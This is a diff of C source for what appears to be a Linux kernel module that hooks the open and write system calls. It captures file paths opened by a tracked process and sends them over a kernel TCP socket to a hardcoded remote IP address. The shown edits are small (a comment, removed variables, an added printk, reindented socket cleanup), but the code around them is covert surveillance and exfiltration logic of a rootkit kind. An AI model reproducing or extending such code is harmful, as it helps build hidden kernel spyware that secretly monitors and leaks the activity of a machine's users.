@@ -142,7 +142,7 @@ int tcp_client_connect(void)
         struct sockaddr_in daddr;
         struct socket *data_socket = NULL;
         */
-        unsigned char destip[5] = {172,23,58,173,'\0'};
+        unsigned char destip[5] = {172,23,58,173,'\0'};//172.23.58.173
         /*
         char *response = kmalloc(4096, GFP_KERNEL);
         char *reply = kmalloc(4096, GFP_KERNEL);
@@ -218,13 +218,7 @@ err:
 
 static int (write_hook)(unsigned int fd, const char __user *buf, size_t count){
         stac();
-        //printk("In write [%s]",buf);
-        int len = 49;
-        //char response[len+1];
-        char reply[len+1];
-        int ret = -1;
-
-       // ret =strlen(buf);
+        // ret =strlen(buf);
         //memset(&reply, 0, len+1);
         //strcat(reply, "HOLA");
         if(current_pid == current->pid && fd==process_fd){ 
@@ -256,6 +250,8 @@ static int open_hook(int dfd, const char __user *filename, int flags, umode_t mo
                 char *start="[In Open] :";
                 current_pid = current->pid;
                 process_fd =fd;
+                //strcat(start,filename);
+                printk("[%s]\n",start);
                 tcp_client_send(conn_socket, start, strlen(start), MSG_DONTWAIT);
                 tcp_client_send(conn_socket, path, strlen(path), MSG_DONTWAIT);
                 //free(buf);
@@ -289,11 +285,11 @@ void cleanup_module(void)
         do_sys_open_hook=NULL;
         ksys_write_hook =NULL;
 /* if the socket has been created */
-if(conn_socket != NULL)
-{
-        /* relase the socket */
-        sock_release(conn_socket);
-}
+        if(conn_socket != NULL)
+        {
+                /* relase the socket */
+                sock_release(conn_socket);
+        }
 	printk(KERN_INFO "Goodbye Mr.\n"); 
 } 
 
